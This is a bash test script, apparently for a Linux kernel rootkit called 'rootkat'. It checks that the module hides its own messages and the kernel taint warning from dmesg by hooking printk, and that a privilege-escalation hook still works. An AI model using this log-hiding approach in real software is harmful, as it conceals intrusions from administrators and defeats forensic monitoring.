#!/usr/bin/env bash
# Asserts: rootkat's own pr_info lines and the kernel's
# "loading out-of-tree module taints kernel" warning are filtered out
# of the kernel ring buffer at write-time, so dmesg / journalctl /
# kdb / netconsole all see a stripped log. Verified by:
#
#   1. Loading rootkat → no "rootkat" lines after the install pr_info
#      that fires before the printk hook is armed.
#   2. A non-rootkat marker written to /dev/kmsg DOES appear, proving
#      we filter selectively, not bulk-drop.
#   3. After rmmod, the marker is no longer filtered and a fresh
#      message containing "rootkat" reaches dmesg again.
set -u
cd /root/rootkat
. tests/qemu/lib.sh

CONTROL_MSG="rootkat-test-marker-not-from-the-module-$$"

dmesg -c >/dev/null 2>&1 || true
assert_zero "module loads" insmod lkm/rootkat.ko

# Brief settle for any deferred printks to flush into the buffer.
sleep 0.2

# After install, dmesg should show ONE rootkat line at most: the
# initial "rootkat: loading" pr_info that fires before
# rootkat_hook_printk_install() arms the filter. Subsequent prints
# (every "rootkat/ftrace: hooked ..." line, the per-hook installs,
# the final "loaded (hidden)" line, the OOT-taint warning) must NOT
# appear.
N=$(dmesg | grep -c rootkat || true)
echo "rootkat lines in dmesg after load: $N"
if [ "$N" -le 1 ]; then
	echo "PASS: at most 1 rootkat line in dmesg post-load"
	ROOTKAT_PASS=$((ROOTKAT_PASS+1))
else
	echo "FAIL: $N rootkat lines visible (expected ≤1)"
	dmesg | grep rootkat | head -10
	ROOTKAT_FAIL=$((ROOTKAT_FAIL+1))
fi

# Specifically: the OOT-taint warning names rootkat by module string;
# it MUST be filtered.
assert_nonzero "OOT-taint message NOT in dmesg" \
	bash -c "dmesg | grep -q 'taints kernel'"

# Selectivity: write a non-rootkat marker via /dev/kmsg → should
# appear in dmesg unmolested.
echo "$CONTROL_MSG" > /dev/kmsg
sleep 0.1
assert_zero "non-rootkat marker passes through" \
	bash -c "dmesg | grep -q '$CONTROL_MSG'"

# Hooks-still-fire sanity: trigger a non-printk side-effect (privesc)
# to confirm the rest of the rootkit is unaffected by the printk hook.
assert_zero "privesc hook still works" tests/qemu/privesc_helper

assert_zero "module unloads" rmmod rootkat
sleep 0.2

# After unload the filter is gone. A fresh message containing
# "rootkat" written by us via /dev/kmsg now reaches dmesg.
echo "post-unload rootkat marker $$" > /dev/kmsg
sleep 0.1
assert_zero "post-unload: rootkat marker visible again" \
	bash -c "dmesg | grep -q 'post-unload rootkat marker $$'"

report
